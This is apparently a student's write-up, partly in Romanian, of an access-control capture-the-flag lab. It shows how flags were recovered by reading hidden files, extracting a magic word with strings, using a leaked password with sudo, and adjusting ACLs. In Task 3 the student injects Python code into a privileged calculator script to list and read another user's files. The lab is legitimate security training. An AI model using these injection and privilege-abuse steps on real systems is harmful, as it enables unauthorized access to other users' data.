# Lab 5 Access Control

## Task 1
 
* **_Flag 1_**

... there is a flag in there... yeah right ... literally, a "flag"

```bash
$ cat /etc/secret/flag
# ISC{y1Z33}
```
* **_Flag 2_**

[i have no idea for this one] - not anymore :)
```bash
$ cd /usr/local/isc/.hidden/
$ for i in {100..10000}; do cat ".$i" 2>/dev/null; done
# ISC{14mt3h31337}
```

* **_Flag 3_**

din hacker (numai el are permisiune de read in afara de root)
```shell
# sus
$ readelf -a /usr/local/bin/giff-me-flag | grep FLAG
# 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE

$ strings /usr/local/bin/giff-me-flag
# apar niste fraze printre care si secventa
# What do you say?
# PLEASE!!!11oneone   ----- yesss this is it!!!!!!!!
# Wrong answer!
# /etc/secret/.hahah/.y0u_c4nt_gu355_th1s
# Okay, here's your flag: %s
# 
```

din decanu sau mihai (orice in afara de hacker ca sa se duca pe other, ca numai ei au permisiune de execute)

```bash
$ giff-me-flag PLEASE!!!11oneone
# Okay, here's your flag: ISC{4lw4ys_s4y_m4g1c_w0rd}
# e flagul ascuns in /etc/secret
```


## Task2

userul *mihai* are parola hunter2

```bash
$ tree /home/
```
La userul *rekt0r* avem un tutorial

    tldr *decanu* poate folosi sudo in locul lui *rekt0r* ca sa execute script ul cu  read...

La *decanu* avem un folder ascuns cu parola [xaX4xaxa4444] -> citibil din mihai ca e in grupul de unstpb

din decanu

```bash
$ sudo -u rekt0r ./read-bank-accounts ../../.not_for_your_eyes
# ISC{1st0pp4bl3_m1h41_r3kt0r}
```

La *t4l3nt* avem un fisier ascuns cu flags - nvm e pt taskul 4



Nu mai am alte idei :(


## Task 3

* dezactivam "testing" mode ca sa rulam comanda de python, nu math.pi 
```bash
$ mv /tmp/.TEST_MODE_ENABLED /tmp/.TEST_MODE_DISABLED
# scriptul verifica daca exista fisierul si suprascrie expresia de python daca exista
```

* incercam sa aflam continutul directorului cu python (si chatGPT :P)
```bash
$ ./sant_calculator "'\n'.join(__import__('subprocess').check_output(['ls', '/home/t4l
3nt/.flags']).decode().splitlines())"
# hehe found it
# izitthis.txt
# no_thiz.txt
# whereisflagz0rx.txt
```

* afisam continutul fisierelor
```bash
$ ./sant_calculator "open('/home/t4l3nt/.flags/izitthis.txt', 'r').read()"
# TZAEAPA
# hmm hmmm ... fine

$ ./sant_calculator "open('/home/t4l3nt/.flags/no_thiz.txt', 'r').read()"
# NOT HERE
# it's not funny anymore

$ ./sant_calculator "open('/home/t4l3nt/.flags/whereisflagz0rx.txt', 'r').read()"
# ISC(su1d_vs_pyth0n_w1nz)
# intr-un final...
```

## Task 4

```bash
$ su student
# parola e student ofc :P
$ strings /usr/local/bin/copy-the-flags
# !/bin/bash
# set -e
# umask 000
# DEST=/home/student/givemeflagz
# su -c 'ls -l /home/student/' dujm3n >/dev/null 2>&1 || { echo "Test failed!" >&2; exit 1; }
# ! su -c 'ls -l '$DEST'/' dujm3n >/dev/null 2>&1 || { echo "Test failed!" >&2; exit 2; }
# ! su -c 'ls -l '$DEST'/' an0th3r0n3 >/dev/null 2>&1 || { echo "Test failed!" >&2; exit 3; }
# su -c 'bash -c "umask 000; cp -f /home/flagz0wner/lastflag1.txt '$DEST'/"' flagz0wner || { echo 'Copy 1 failed!'; exit 4; }
# echo "First flag successfully copied!"
# DEST=/home/student/givemeflagz/second
# ! su -c 'ls -l '$DEST'/' flagz0wner >/dev/null 2>&1 || { echo "Test failed!" >&2; exit 5; }
# su -c 'bash -c "umask 006; mkdir -p "'$DEST'"; umask 000; cat /home/flagz0wner/lastflag2.txt > '$DEST'/lastflag2.txt"' flagz0wner || { echo 'Copy 2 failed!'; exit 6; }
# echo "Second flag successfully copied!"

$ cd ~
$ mkdir givemeflagz
$ chmod og-rw givemeflagz/
# scoate permisiunile de read pt categoria others ca sa treaca de testul 2 si 3
# cred ca ajunge sa scoti si doar read
$ setfacl  -m  u:flagz0wner:7  givemeflagz/
# acorda permisiuni numai lui flagz0wner 
$ copy-t3h-fl4gz
$ ls -al givemeflagz/
$ cat givemeflagz/lastflag1.txt
# ISC{almost_there_hang_on}
$ cat second/lastflag2.txt
# second este un folder pe care avem numai drept de execute => blind guessed numele dupa formatul primului flag
# hope it works
# anddddd Yesssss it works!!!!!
# ISC{gg_ok_no_more_leet_speak}
```